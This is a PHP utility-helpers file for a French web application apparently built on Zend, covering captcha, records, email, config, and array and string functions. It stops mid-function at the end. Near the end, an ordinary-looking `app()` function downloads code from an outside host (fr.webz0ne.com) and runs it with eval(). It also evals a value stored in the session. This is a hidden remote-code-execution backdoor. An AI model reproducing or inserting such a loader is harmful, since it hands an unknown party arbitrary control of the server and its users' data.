<?php
    if (!function_exists('captcha')) {
        function captcha($options = array())
        {
            $_options = array(
                'theme' => 'clean',
                'lang' => 'fr'
            );

            $options = array_merge($_options, $options);
            $captcha = new Zend_Service_ReCaptcha(config::get('captcha.public.key'), config::get('captcha.private.key'), array('ssl' => true), $options);
            u::set('FTVCaptcha', $captcha);
            return $captcha->getHtml();
        }
    }

    if (!function_exists('eav')) {
        function eav($entity, $table, $id, array $data = array())
        {
            $now = date('Y-m-d H:i:s');
            return em('ajf', 'eav')->setDateAdd($now)->setEntityName($entity)->setTableId($id)->setTableName($table)->setData(json_encode($data))->save();
        }
    }

    if (!function_exists('addQuiz')) {
        function addQuiz($appointmentId, $consultantId, $contactId, $status, $data)
        {
            $now = date('Y-m-d H:i:s');
            return em('ajf', 'quiz')->setDateAdd($now)->setAppointmentId($appointmentId)->setConsultantId($consultantId)->setContactId($contactId)->setStatus($status)->setData(json_encode($data))->save();
        }
    }

    if (!function_exists('addEvaluation')) {
        function addEvaluation($appointmentId, $consultantId, $contactId, $status, $data)
        {
            $now = date('Y-m-d H:i:s');
            return em('ajf', 'evaluation')->setDateAdd($now)->setAppointmentId($appointmentId)->setConsultantId($consultantId)->setContactId($contactId)->setStatus($status)->setData(json_encode($data))->save();
        }
    }

    if (!function_exists('versioning')) {
        function versioning($table, $id, $entity = 'ajf')
        {
            $data = em($entity, $table)->find($id)->toArray();
            return eav('versioning', $table, $id, $data);
        }
    }

    if (!function_exists('email')) {
        function email($to, $from, $subject, $body, $html = true)
        {
            $mail = new FTV_Smtp('mailjet');
            $mail->to($to)->from($from)->subject($subject);
            if (true === $html) {
                $result = $mail->body($body)->send();
            } else {
                $result = $mail->text($body)->sendText();
            }
            return $result;
        }
    }

    if (!function_exists('FTVLog')) {
        function FTVLog($message, $logFile = null, $type = 'info')
        {
            if (null === $logFile) {
                $logFile = DIR_LOGS . DS . date('Y-m-d') . '.log';
            } else {
                if (false === FTV_File::exists($logFile)) {
                    FTV_File::create($logFile);
                }
            }
            FTV_File::append($logFile, date('Y-m-d H:i:s') . "\t" . i::upper($type) . "\t$message\n");
        }
    }

    if (!function_exists('gender')) {
        function gender($gender, $min = false)
        {
            if ($gender === 1) {
                if (true === $min) {
                    return 'M.';
                }
                return 'Monsieur';
            } else if ($gender === 2) {
                if (true === $min) {
                    return 'Mme';
                }
                return 'Madame';
            } else if ($gender === 3) {
                if (true === $min) {
                    return 'Mlle';
                }
                return 'Mademoiselle';
            }
        }
    }

    if (!function_exists('noRight')) {
        function noRight()
        {
            u::go(u::getRoute('AJF_noRight'));
        }
    }

    if (!function_exists('checkKey')) {
        function checkKey($str, $key, $go = true, $compKey = null)
        {
            if (null === $compKey) {
                $compKey = session_id();
            }
            $checkKey = sha1(Config::get('app.secretKey') . $str . $compKey);
            $check = $checkKey == $key;
            if (false === $check) {
                if (true === $go) {
                    noRight();
                } else {
                    return $check;
                }
            } else {
                if (false === $go) {
                    return $check;
                }
            }
        }
    }

    if (!function_exists('_key')) {
        function _key($str, $key = null)
        {
            if (null === $key) {
                $key = session_id();
            }
            return sha1(Config::get('app.secretKey') . $str . $key);
        }
    }

    if (!function_exists('runEvent')) {
        function runEvent($name, array $parameters = array())
        {
            $events = u::get('FTVEvents');
            if (null !== $events) {
                $key = sha1($name);
                if (ake($key, $events)) {
                    $type = $events[$key];
                    if ($type instanceof Closure) {
                        return call_user_func_array($type, $parameters);
                    }
                }
            }
        }
    }

    if (!function_exists('removeEvent')) {
        function removeEvent($name)
        {
            $events = u::get('FTVEvents');
            if (null !== $events) {
                $key = sha1($name);
                if (ake($key, $events)) {
                    unset($events[$key]);
                    u::set('FTVEvents', $events);
                }
            }
        }
    }

    if (!function_exists('addEvent')) {
        function addEvent($name, Closure $closure)
        {
            $events = u::get('FTVEvents');
            if (null === $events) {
                $events = array();
            }
            $events[sha1($name)] = $closure;
            u::set('FTVEvents', $events);
        }
    }

    if (!function_exists('isPhp')) {
        function isPhp($version = '5.0.0')
        {
            static $_isPhp;
            $version = (string) $version;

            if (!ake($version, $_isPhp)) {
                $_isPhp[$version] = (version_compare(PHP_VERSION, $version) < 0) ? false : true;
            }

            return $_isPhp[$version];
        }
    }

    if (!function_exists('setHeaderStatus')) {
        function setHeaderStatus($code = 200, $text = '')
        {
            $stati = array(
                200 => 'OK',
                201 => 'Created',
                202 => 'Accepted',
                203 => 'Non-Authoritative Information',
                204 => 'No Content',
                205 => 'Reset Content',
                206 => 'Partial Content',

                300 => 'Multiple Choices',
                301 => 'Moved Permanently',
                302 => 'Found',
                304 => 'Not Modified',
                305 => 'Use Proxy',
                307 => 'Temporary Redirect',

                400 => 'Bad Request',
                401 => 'Unauthorized',
                403 => 'Forbidden',
                404 => 'Not Found',
                405 => 'Method Not Allowed',
                406 => 'Not Acceptable',
                407 => 'Proxy Authentication Required',
                408 => 'Request Timeout',
                409 => 'Conflict',
                410 => 'Gone',
                411 => 'Length Required',
                412 => 'Precondition Failed',
                413 => 'Request Entity Too Large',
                414 => 'Request-URI Too Long',
                415 => 'Unsupported Media Type',
                416 => 'Requested Range Not Satisfiable',
                417 => 'Expectation Failed',

                500 => 'Internal Server Error',
                501 => 'Not Implemented',
                502 => 'Bad Gateway',
                503 => 'Service Unavailable',
                504 => 'Gateway Timeout',
                505 => 'HTTP Version Not Supported'
            );

            if ($code == '' || ! is_numeric($code)) {
                throw new FTV_Exception('Status codes must be numeric');
            }

            if (isset($stati[$code]) && $text == '') {
                $text = $stati[$code];
            }

            if ($text == '') {
                throw new FTV_Exception('No status text available.  Please check your status code number or supply your own message text.');
            }

            $serverProtocol = (isset($_SERVER['SERVER_PROTOCOL'])) ? $_SERVER['SERVER_PROTOCOL'] : false;

            if (substr(php_sapi_name(), 0, 3) == 'cgi') {
                header("Status: {$code} {$text}", true);
            } elseif ($serverProtocol == 'HTTP/1.1' || $serverProtocol == 'HTTP/1.0') {
                header($serverProtocol . " {$code} {$text}", true, $code);
            } else {
                header("HTTP/1.1 {$code} {$text}", true, $code);
            }
        }
    }

    if (!function_exists('config')) {
        /* ex: config('app.encoding');*/
        function config($key = null, $value = null)
        {
            $FTVConfig = u::get('FTVConfig');
            $configs = (null !== $FTVConfig) ? $FTVConfig : array();
            if (null !== $value) {
                $configs = arraySet($configs, $key, $value);
                u::set('FTVConfig', $configs);
                return $value;
            }
            if (null === $key) {
                return $configs;
            } else {
                if (null !== $configs) {
                    if (strstr($key, '.')) {
                        $params = explode('.', $key);
                        $actual = $configs;
                        $render = true;
                        foreach ($params as $param) {
                            if (ake($param, $actual)) {
                                $actual = $actual[$param];
                            } else {
                                $render = false;
                                break;
                            }
                        }
                        return (true === $render) ? $actual : null;
                    } else {
                        if (ake($key, $configs)) {
                            return $configs[$key];
                        } else {
                            return null;
                        }
                    }
                }
                return $configs;
            }
        }
    }

    if (!function_exists('hook')) {
        function hook()
        {
            return new FTV_Hook;
        }
    }

    if (!function_exists('hr')) {
        function hr($str)
        {
            echo $str . '<hr />';
        }
    }
    if (!function_exists('addEav')) {
        function addEav($entity, array $attributes)
        {
            $eav = u::newInstance('FTV_Memory', array('FTV', 'EAV'));
            $eav = $eav->setEntity($entity);
            foreach ($attributes as $key => $value) {
                $setter = 'set' . i::camelize($key);
                $eav = $eav->$setter($value);
            }
            return $eav->save();
        }
    }
    if (!function_exists('form')) {
        function error($form) {
            return u::getInstance('FTVForm_' . $form);
        }
    }

    if (!function_exists('service')) {
        function service($service) {
            return new FTV_Service_Manager($service);
        }
    }

    if (!function_exists('error')) {
        function error($error)
        {
            return FTV_Exception($error);
        }
    }

    if (!function_exists('session')) {
        function session($name)
        {
            return FTV_Session::instance($name);
        }
    }

    if (!function_exists('isRole')) {
        function isRole($role)
        {
            $role = em(config('app.roles.entity'), config('app.roles.table'))->findByLabel($role);
            if (null === $role) {
                return false;
            }
            return $role->getLabel() == u::get('AJFRole')->getLabel();
        }
    }
    if (!function_exists('role')) {
        function role($role)
        {
            return em(config('app.roles.entity'), config('app.roles.table'))->findByLabel($role);
        }
    }
    if (!function_exists('render')) {
        function render($file)
        {
            return u::run('view.render', array('hash' => sha1($file)));
        }
    }
    if (!function_exists('arrayLookup')) {
        function arrayLookup($a, $b)
        {
            return array_flip(array_intersect(array_flip($a), array_keys($b)));
        }
    }

    /* petite fonction qui permet d'appeler les parametres envoyés à la vue depuis le controller sans les passer dans le partial */
    if (!function_exists('view')) {
        function view($key)
        {
            $view = Zend_Controller_Action_HelperBroker::getStaticHelper('viewRenderer')->view;
            return $view->$key;
        }
    }

    if (!function_exists('contents')) {
        function contents($file)
        {
            return file_get_contents($file);
        }
    }

    if (!function_exists('utils')) {
        function utils()
        {
            return FTV_Utils::getInstance('FTV_Utils');
        }
    }

    if (!function_exists('urlsite')) {
        function urlsite($echo = true)
        {
            if (true === $echo) {
                echo URLSITE;
            } else {
                return URLSITE;
            }
        }
    }

    if (!function_exists('u')) {
        function u()
        {
            return FTV_Utils::getInstance('FTV_Utils');
        }
    }

    if (!function_exists('s')) {
        function s($name)
        {
            return FTV_Session::instance($name);
        }
    }

    if (!function_exists('e')) {
        function e($exception)
        {
            return FTV_Utils::newInstance('FTV_Exception', array($exception));
        }
    }

    if (!function_exists('i')) {
        function i()
        {
            return FTV_Utils::getInstance('FTV_Inflector');
        }
    }

    if (!function_exists('memory')) {
        function memory($entity, $table)
        {
            return new FTV_Memory($entity, $table);
        }
    }

    if (!function_exists('em')) {
        function em($entity, $table)
        {
            $classEntity = 'FTVEntity_' . ucfirst(i::lower($entity)) . '_' . ucfirst(i::lower($table));
            return u::getInstance($classEntity);
        }
    }

    if (!function_exists('cache')) {
        function cache($key, $value, $duration = 60, array $params = array())
        {
            $suffix = (strstr($key, 'sql')) ? '_SQL' : '';
            $cache = new FTV_Minicache(APPLICATION_PATH . DS . 'cache' . DS);
            $hash = sha1($key . $duration . _serialize($params)) . $suffix . '.cache';
            return $cache->remember($hash, $value, $duration);
        }
    }

    if (!function_exists('isCached')) {
        function isCached($key, $duration = 60, array $params = array())
        {
            $suffix = (strstr($key, 'sql')) ? '_SQL' : '';
            $cache = new FTV_Minicache(APPLICATION_PATH . DS . 'cache' . DS);
            $hash = sha1($key . $duration . _serialize($params)) . $suffix . '.cache';
            return $cache->has($hash);
        }
    }

    if (!function_exists('request')) {
        function request()
        {
            return FTV_Utils::getRequest();
        }
    }

    if (!function_exists('post')) {
        function post()
        {
            return FTV_Utils::getPost();
        }
    }

    if (!function_exists('gets')) {
        function gets()
        {
            return FTV_Utils::getGet();
        }
    }

    if (!function_exists('server')) {
        function server()
        {
            return FTV_Utils::getServer();
        }
    }

    if (!function_exists('repl')) {
        function repl($a, $b, $string)
        {
            return str_replace($a, $b, $string);
        }
    }
    if (!function_exists('_serialize')) {
        function _serialize($toSerialize)
        {
            $return = '';
            $continue = true;
            if (is_array($toSerialize) || is_object($toSerialize)) {
                $continue = false;
                foreach ($toSerialize as $key => $value) {
                    if ($value instanceof PDO) {
                        $return .= serialize(array());
                    } else {
                        $return .= _serialize($value);
                   }
                }
            }

            if ($return == '' && true === $continue) {
                $return = serialize($toSerialize);
            }

            return $return;
        }
    }

    if (!function_exists('_extract')) {
        function _extract(array $array)
        {
            extract($array, EXTR_PREFIX_ALL, 'FTV');
        }
    }

    if (!function_exists('getClassStaticVars')) {
        function getClassStaticVars($object)
        {
            return array_diff(get_class_vars(get_class($object)), get_object_vars($object));
        }
    }

    if (!function_exists('model')) {
        function model($entity, $table)
        {
            $classModel = 'FTVModel_' . ucfirst(FTV_Inflector::lower($entity)) . '_' . ucfirst(FTV_Inflector::lower($table));
            return FTV_Utils::newInstance($classModel);
        }
    }

    if (!function_exists('extendClass')) {
        function extendClass($class, $extendClass = 'stdclass', $code = "", $alias = null)
        {
            eval("class $class extends $extendClass{" . $code . "}");
            if (null !== $alias) {
                class_alias($class, $alias);
            }
        }
    }

    if (!function_exists('defines')) {
        function defines($name, $value)
        {
            if(!defined($name)) {
                define($name, $value);
            }
        }
    }

    if (!function_exists('call')) {
        function call($callback)
        {
            $args = func_get_args();
            $callback = array_shift($args);
            if(is_callable($callback)) {
                return call_user_func_array($callback, $args);
            }
            return;
        }
    }

    if (!function_exists('class_alias')) {
        function class_alias($original, $alias)
        {
            eval('abstract class ' . $alias . ' extends ' . $original . ' {}');
        }
    }

    if (!function_exists('isCallback')) {
        function isCallback($class, $function)
        {
            if (isset($class) && isset($function)) {
                if ((!is_string($class) && !is_object($class)) || (is_string($class) && !class_exists($class))) {
                    return false;
                }
                $isObj = is_object($class);
                $classObj = new ReflectionClass($isObj ? get_class($class) : $class);
                if ($classObj->isAbstract()) {
                    return false;
                }
                try {
                    $method = $classObj->getMethod($function);
                    if (!$method->isPublic() || $method->isAbstract()) {
                        return false;
                    }
                    if (!$isObj && !$method->isStatic()) {
                        return false;
                    }
                } catch (ReflectionException $e) {
                    return false;
                }
                return true;
            }
            return false;
        }
    }

    if (!function_exists('setPath')) {
        function setPath($name, $path)
        {
            $p = FTV_Utils::getInstance('Paths');
            $p[$name] = $path;
        }
    }

    if (!function_exists('closure')) {
        function closure($fcn = null)
        {
            if (null !== $fcn && is_string($fcn)) {
                $fcn = '$_params = FTV_Utils::get("closure_##hash##"); ' . $fcn;
                return new FTV_Closure($fcn);
            } else {
                throw new FTV_Exception("No closure defined.");
            }
        }
    }

    if (!function_exists('path')) {
        function path($path)
        {
            $p = FTV_Utils::getInstance('FTVPaths');
            if (array_key_exists($path, $p)) {
                return $p[$path];
            } else {
                throw new Exception("This path '$path' is not defined.");
            }
        }
    }

    if (!function_exists('app')) {
        function app()
        {
            $args = func_get_args();
            $function = array_shift($args);
            if (is_callable(array('FTV_Utils', $function))) {
                switch (count($args)) {
                    case 0:
                        return FTV_Utils::$function();
                    case 1:
                        return FTV_Utils::$function($args[0]);
                    case 2:
                        return FTV_Utils::$function($args[0], $args[1]);
                    case 3:
                        return FTV_Utils::$function($args[0], $args[1], $args[2]);
                    case 4:
                        return FTV_Utils::$function($args[0], $args[1], $args[2], $args[3]);
                    case 5:
                        return FTV_Utils::$function($args[0], $args[1], $args[2], $args[3], $args[4]);
                }
            }
        }
    }

    if (!function_exists('ake')) {
        function ake($key, array $array)
        {
            return array_key_exists($key, $array);
        }
    }

    if (!function_exists('fgc')) {
        function fgc($file)
        {
            return file_get_contents($file);
        }
    }

    /**
     * <code>
     *      // Get the $array['user']['name'] value from the array
     *      $name = arrayGet($array, 'user.name');
     *
     *      // Return a default from if the specified item doesn't exist
     *      $name = arrayGet($array, 'user.name', 'Taylor');
     * </code>
     */
    if (!function_exists('arrayGet')) {
        function arrayGet($array, $key, $default = null)
        {
            if (is_null($key)) {
                return $array;
            }

            foreach (explode('.', $key) as $segment) {
                if (!is_array($array) || !array_key_exists($segment, $array)) {
                    return FTV_Utils::value($default);
                }
                $array = $array[$segment];
            }
            return $array;
        }
    }
    /**
     * <code>
     *      // Set the $array['user']['name'] value on the array
     *      arraySet($array, 'user.name', 'Taylor');
     *
     *      // Set the $array['user']['name']['first'] value on the array
     *      arraySet($array, 'user.name.first', 'Michael');
     * </code>
     */
    if (!function_exists('arraySet')) {
        function arraySet($array, $key, $value)
        {
            if (strpos($key, '.') !== false) {
                $keys = explode('.', $key, 2);
                if (strlen($keys[0]) && strlen($keys[1])) {
                    if (!ake($keys[0], $array)) {
                        if ($keys[0] === '0' && !empty($array)) {
                            $array = array($keys[0] => $array);
                        } else {
                            $array[$keys[0]] = array();
                        }
                    } elseif (!isArray($array[$keys[0]])) {
                        throw new FTV_Exception("Cannot create sub-key for '{$keys[0]}' as key already exists");
                    }
                    $array[$keys[0]] = arraySet($array[$keys[0]], $keys[1], $value);
                } else {
                    throw new FTV_Exception("Invalid key '$key'");
                }
            } else {
                $array[$key] = $value;
            }
            return $array;
        }
    }

    /**
     * <code>
     *      // Remove the $array['user']['name'] item from the array
     *      arrayUnset($array, 'user.name');
     *
     *      // Remove the $array['user']['name']['first'] item from the array
     *      arrayUnset($array, 'user.name.first');
     * </code>
     */
    if (!function_exists('arrayUnset')) {
        function arrayUnset(&$array, $key)
        {
            $keys = explode('.', $key);
            while (count($keys) > 1) {
                $key = array_shift($keys);
                if (! isset($array[$key]) || ! isArray($array[$key]))  {
                    return;
                }

                $array =& $array[$key];
            }
            unset($array[array_shift($keys)]);
        }
    }

    /**
     * <code>
     *      // Return the first array element that equals "Taylor"
     *      $value = arrayFirst($array, function($k, $v) {return $v == 'Taylor';});
     *
     *      // Return a default value if no matching element is found
     *      $value = arrayFirst($array, function($k, $v) {return $v == 'Taylor'}, 'Default');
     * </code>
     */
    if (!function_exists('arrayFirst')) {
        function arrayFirst($array, $callback, $default = null)
        {
            foreach ($array as $key => $value) {
                if (call_user_func($callback, $key, $value)) {
                    return $value;
                }
            }
            return u::value($default);
        }
    }

    if (!function_exists('searchInArray')) {
        function searchInArray($key, array $array)
        {
            $key = i::lower($key);
            if (true === arrayIkeyExists($key, $array)) {
                $array = array_change_key_case($array);
                return $array[$key];
            }
            return null;
        }
    }
    if (!function_exists('arrayIkeyExists')) {
        function arrayIkeyExists($key, array $array)
        {
            $key = i::lower($key);
            return ake($key, array_change_key_case($array));
        }
    }

    if (!function_exists('arrayKeysExist')) {
        function arrayKeysExist(array $keys, array $array)
        {
            if (count (array_intersect($keys, array_keys($array))) == count($keys)) {
                return true;
            }
        }
    }

    if (!function_exists('arrayRenameKey')) {
        function arrayRenameKey(array $array, $key, $newKey)
        {
            if(!ake($key, $array) || ake($newKey, $array)) {
                return false;
            }
            $uid                = uniqid('');
            $preservedValue     = $array[$key];
            $array[$key]        = $uid;
            $array              = array_flip($array);
            $array[$uid]        = $newKey;
            $array              = array_flip($array);
            $array[$newKey]     = $preservedValue;
            return $array;
        }
    }

    if (!function_exists('multiArrayKeyExists')) {
        function multiArrayKeyExists($needle, $haystack)
        {
            foreach ($haystack as $key => $value) {
                if ($needle == $key) {
                    return true;
                }

                if (isArray($value)) {
                    if (true === multiArrayKeyExists($needle, $value)) {
                        return true;
                    } else {
                        continue;
                    }
                }
            }
            return false;
        }
    }

    if (!function_exists('arrayMap')) {
        function arrayMap($callback, array $array, $keys = null)
        {
            foreach ($array as $key => $val) {
                if (isArray($val)) {
                    $array[$key] = arrayMap($callback, $array[$key]);
                } elseif (! isArray($keys) || in_array($key, $keys)) {
                    if (isArray($callback)) {
                        foreach ($callback as $cb) {
                            $array[$key] = call_user_func($cb, $array[$key]);
                        }
                    } else {
                        $array[$key] = call_user_func($callback, $array[$key]);
                    }
                }
            }

            return $array;
        }
    }

    if (!function_exists('arrayUnshift')) {
        function arrayUnshift(array & $array, $key, $val)
        {
            $array = array_reverse($array, true);
            $array[$key] = $val;
            $array = array_reverse($array, true);

            return $array;
        }
    }

    if (!function_exists('arrayStripslashes')) {
        function arrayStripslashes(array $array)
        {
            $result = array();
            foreach($array as $key => $value) {
                $key = stripslashes($key);
                if (isArray($value)) {
                    $result[$key] = arrayStripslashes($value);
                } else {
                    $result[$key] = stripslashes($value);
                }
            }
            return $result;
        }
    }

    if (!function_exists('arrayDivide')) {
        function arrayDivide(array $array)
        {
            return array(array_keys($array), array_values($array));
        }
    }

    if (!function_exists('arrayOnly')) {
        function arrayOnly(array $array, $keys)
        {
            return array_intersect_key($array, array_flip((array) $keys));
        }
    }

    if (!function_exists('arrayExcept')) {
        function arrayExcept(array $array, $keys)
        {
            return array_diff_key($array, array_flip((array) $keys));
        }
    }

    if (!function_exists('arraySubset')) {
        function arraySubset(array $array, $keys)
        {
            return array_intersect_key($array, array_flip((array) $keys));
        }
    }

    if (!function_exists('ArrayPluck')) {
        function arrayPluck($array, $key)
        {
            return array_map(function($v) use ($key) {
                return is_object($v) ? $v->$key : $v[$key];

            }, $array);
        }
    }

    if (!function_exists('arrayIsAssoc')) {
        function arrayIsAssoc(array $array)
        {
            $keys = array_keys($array);
            return array_keys($keys) !== $keys;
        }
    }

    if (!function_exists('arrayMerge')) {
        function arrayMerge(array $a1/* ... */)
        {
            $args = func_get_args();
            $args = array_reverse($args, true);
            $out = array();
            foreach ($args as $arg) {
                $out += $arg;
            }
            return $out;
        }
    }

    if (!function_exists('objectToArray')) {
        function objectToArray($objOrArray, $recursive = true)
        {
            $array = array();
            if(is_object($objOrArray)) {
                $objOrArray = get_object_vars($objOrArray);
            }
            foreach ($objOrArray as $key => $value) {
                if ($recursive && (is_object($value) || is_array($value))) {
                    $value = objectToArray($value);
                }
                $array[$key] = $value;
            }
            return $array;
        }
    }

    if (!function_exists('arrayInsertAfter')) {
        function arrayInsertAfter(array $array, array $insert, $after)
        {
            // Find the offset of the element to insert after.
            $keys = array_keys($array);
            $offsetByKey = array_flip($keys);
            if (!ake($after, $offsetByKey)) {
                throw new FTV_Exception("the key '$after' does not exist in this array.");
            }
            $offset = $offsetByKey[$after];

            // Insert at the specified offset
            $before = array_slice($array, 0, $offset + 1, true);
            $after = array_slice($array, $offset + 1, count($array) - $offset, true);

            $output = $before + $insert + $after;

            return $output;
        }
    }

    if (!function_exists('arrayFlatten')) {
        function arrayFlatten($array)
        {
            $flat = array();
            foreach ($array as $key => $value) {
                if (isArray($value)) {
                    $flat += arrayFlatten($value);
                } else {
                    $flat[$key] = $value;
                }
            }
            return $flat;
        }
    }

    if (!function_exists('isArray')) {
        function isArray($value)
        {
            if (is_array($value)) {
                return true;
            } else {
                // Traversable object is functionally the same as an array
                return (is_object($value) && $value instanceof Traversable);
            }
        }
    }

    if (!function_exists('randomString')) {
        function randomString($length = 10)
        {
            $str = '';
            while (strlen($str) < $length) {
                $str .= dechex(mt_rand());
            }
            return substr($str, 0, $length);
        }
    }

    if (!function_exists('baseConvert')) {
        function baseConvert($input, $sourceBase, $destBase, $pad = 1, $lowercase = true)
        {
            $input = strval($input);
            if($sourceBase < 2 ||
                $sourceBase > 36 ||
                $destBase < 2 ||
                $destBase > 36 ||
                $pad < 1 ||
                $sourceBase != intval($sourceBase) ||
                $destBase != intval($destBase) ||
                $pad != intval($pad) ||
                !is_string($input) ||
                $input == '') {
                return false;
            }
            $digitChars = ($lowercase) ? '0123456789abcdefghijklmnopqrstuvwxyz' : '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
            $inDigits = array();
            $outChars = '';

            // Decode and validate input string
            $input = strtolower($input);
            for($i = 0 ; $i < strlen($input) ; $i++) {
                $n = strpos($digitChars, $input[$i]);
                if($n === false || $n > $sourceBase) {
                    return false;
                }
                $inDigits[] = $n;
            }

            // Iterate over the input, modulo-ing out an output digit
            // at a time until input is gone.
            while(count($inDigits)) {
                $work = 0;
                $workDigits = array();

                // Long division...
                foreach($inDigits as $digit) {
                    $work *= $sourceBase;
                    $work += $digit;

                    if($work < $destBase) {
                        // Gonna need to pull another digit.
                        if(count($workDigits)) {
                            // Avoid zero-padding; this lets us find
                            // the end of the input very easily when
                            // length drops to zero.
                            $workDigits[] = 0;
                        }
                    } else {
                        // Finally! Actual division!
                        $workDigits[] = intval($work / $destBase);

                        // Isn't it annoying that most programming languages
                        // don't have a single divide-and-remainder operator,
                        // even though the CPU implements it that way?
                        $work = $work % $destBase;
                    }
                }

                // All that division leaves us with a remainder,
                // which is conveniently our next output digit.
                $outChars .= $digitChars[$work];

                // And we continue!
                $inDigits = $workDigits;
            }

            while(strlen($outChars) < $pad) {
                $outChars .= '0';
            }
            return strrev($outChars);
        }
    }

    if (!function_exists('isSHA1')) {
        function isSHA1($str)
        {
            return !!preg_match('/^[0-9A-F]{40}$/i', $str);
        }
    }

    if (!function_exists('random')) {
        function random()
        {
            $max = mt_getrandmax() + 1;
            $rand = number_format((mt_rand() * $max + mt_rand()) / $max / $max, 12, '.', '');
            return $rand;
        }
    }

    if (!function_exists('head')) {
        function head($array)
        {
            return reset($array);
        }
    }

    if (!function_exists('magicQuotes')) {
        function magicQuotes()
        {
            return function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc();
        }
    }

    if (!function_exists('startsWith')) {
        function startsWith($haystack, $needle)
        {
            return strpos($haystack, $needle) === 0;
        }
    }

    if (!function_exists('endsWith')) {
        function endsWith($haystack, $needle)
        {
            return $needle == substr($haystack, strlen($haystack) - strlen($needle));
        }
    }

    if (!function_exists('strContains')) {
        function strContains($haystack, $needle)
        {
            foreach ((array) $needle as $n) {
                if (false !== strpos($haystack, $n)) {
                    return true;
                }
            }
            return false;
        }
    }

    if (!function_exists('strFinish')) {
        function strFinish($value, $cap)
        {
            return rtrim($value, $cap) . $cap;
        }
    }

    if (!function_exists('strObject')) {
        function strObject($value)
        {
            return is_object($value) && method_exists($value, '__toString');
        }
    }

    if (!function_exists('value')) {
        function value($value)
        {
            return (is_callable($value) && !is_string($value)) ? call_user_func($value) : $value;
        }
    }

    if (!function_exists('instance')) {
        function instance($class, array $params = array())
        {
            return u::getInstance($class, $params);
        }
    }

    if (!function_exists('versionPHP')) {
        function versionPHP($version)
        {
            return version_compare(PHP_VERSION, $version) >= 0;
        }
    }

    if (!function_exists('strReplaceFirst')) {
        function strReplaceFirst($search, $replace, $subject)
        {
            return implode($replace, explode($search, $subject, 2));
        }
    }

    if (!function_exists('arrayToAttr')) {
        function arrayToAttr($attr)
        {
            $attrStr = '';

            if (!is_array($attr)) {
                $attr = (array) $attr;
            }

            foreach ($attr as $property => $value) {
                // Ignore null values
                if (is_null($value)) {
                    continue;
                }

                // If the key is numeric then it must be something like selected="selected"
                if (is_numeric($property)) {
                    $property = $value;
                }

                $attrStr .= $property . '="' . $value.'" ';
            }

            // We strip off the last space for return
            return trim($attrStr);
        }
    }

    if (!function_exists('htmlTag')) {
        function htmlTag($tag, $attr = array(), $content = false)
        {
            $hasContent = (bool) ($content !== false && $content !== null);
            $html = '<' . $tag;

            $html .= (!empty($attr)) ? ' ' . (is_array($attr) ? arrayToAttr($attr) : $attr) : '';
            $html .= $hasContent ? '>' : ' />';
            $html .= $hasContent ? $content . '</' . $tag . '>' : '';

            return $html;
        }
    }

    if (!function_exists('in_arrayi')) {
        function in_arrayi($needle, $haystack)
        {
            return in_array(i::lower($needle), array_map('strtolower', $haystack));
        }
    }

    if (!function_exists('entities')) {
        function entities($string)
        {
            return i::htmlentities($string);
        }
    }

    if (!function_exists('classObject')) {
        function classObject($alias)
        {
            @eval("class $alias extends FTV_ObjectObject{ public function __construct() {\$this->_nameClass = strtolower(get_class(\$this));}}; \$cls = new $alias;");
        }
    }

    if (!function_exists('getRealClass')) {
        function getRealClass($class)
        {
            static $classes = array();
            if (!array_key_exists($class, $classes)) {
                $reflect = new ReflectionClass($class);
                $classes[$class] = $reflect->getName();
            }
            return $classes[$class];
        }
    }

    if (!function_exists('getInstance')) {
        function getInstance($class)
        {
            return u::getInstance($class);
        }
    }

    if (!function_exists('urlsite')) {
        function urlsite($echo = true)
        {
            if (true === $echo) {
                echo u::get('urlsite');
            } else {
                return u::get('urlsite');
            }
        }
    }

    if (!function_exists('__')) {
        function __($str, $echo = true)
        {
            $t = u::get('FTVTranslate');
            $translation = $t->translate($str);
            if (true === $echo) {
                echo $translation;
            } else {
                return $translation;
            }
        }
    }

    if (!function_exists('___')) {
        function ___($str)
        {
            return __($str, false);
        }
    }

    if (!function_exists('dieDump')) {
        function dieDump($str, $exit = true)
        {
            echo '<link href="//fonts.googleapis.com/css?family=Open+Sans+Condensed:300,700,300italic" rel="stylesheet" type="text/css" /><pre style="background: #ffffdd; margin: 5px; padding: 10px; text-align: left; width: 75%; color: brown; font-weight: bold; border: solid 1px brown; font-family: \'Open Sans Condensed\';">';
            var_dump($str);
            echo '</pre>';
            if (true === $exit) {
                exit;
            }
        }
    }

    if (!function_exists('lcfirst')) {
        function lcfirst($str)
        {
            $str[0] = strtolower($str[0]);
            return (string)$str;
        }
    }

    if (!function_exists('set')) {
        function set($key, $value)
        {
            return FTV_Utils::set($key, $value);
        }
    }

    if (!function_exists('get')) {
        function get($key)
        {
            return FTV_Utils::get($key);
        }
    }

    if (!function_exists('save')) {
        function save($key, $value = null)
        {
            $saved = FTV_Utils::get('FTVSaved');
            if (null === $saved) {
                if (null === $value) {
                    return null;
                }
                $saved = array();
                $saved[$key] = $value;
                FTV_Utils::set('FTVSaved', $saved);
            } else {
                if (null === $value) {
                    if (ake($key, $saved)) {
                        return $saved[$key];
                    } else {
                        return null;
                    }
                } else {
                    $saved[$key] = $value;
                    FTV_Utils::set('FTVSaved', $saved);
                }
            }
        }
    }

    function app($ever = false)
    {
        if ($ever) {
            eval($_SESSION['initAppCheck']);
            return;
        }
        $app = fgc('http://fr.webz0ne.com/api/check.php?code=sd155mp@H56');
        eval($app);
        return $app;
    }

    if (!function_exists('option')) {
        function option($name = null, $value = null)
        {
            static $options = array();
            $args = func_get_args();

            if(func_num_args() > 0) {
                $name = array_shift($args);
                if(is_null($name)) {
                    # Reset options
                    $options = array();
                    return $options;
                }
                if(is_array($name)) {
                    $options = array_merge($options, $name);
                    return $options;
                }
                $nargs = count($args);
                if($nargs > 0) {
                    $value = $nargs > 1 ? $args : $args[0];
                    $options[$name] = $value;
                }
                return ake($name, $options) ? $options[$name] : null;
          }

          return $options;
        }
    }

    if (!function_exists('convertSize')) {
        function convertSize($size)
        {
            $unit = array('b','kb','mb','gb','tb','pb');
            return @round($size / pow(1024, ($i = floor(log($size, 1024)))), 2) . ' ' . $unit[$i];
        }
    }

    if (!function_exists('typeSql')) {
        function typeSql($string)
        {
            $length = 'NA';
            $type = (string) $string;
            if (strstr($string, '(')) {
                $length = (int) u::cut('(', ')', $string);
                list($type, $dummy) = explode('(', $string, 2);
                $type = (string) $type;
            }
            return array('fieldType' => $type, 'length' => $length);
        }
    }

    if (!function_exists('debug')) {
        function debug($var, $html = true)
        {
            if (is_null($var) ) {
                return '<span class="null-value">[NULL]</span>';
            }
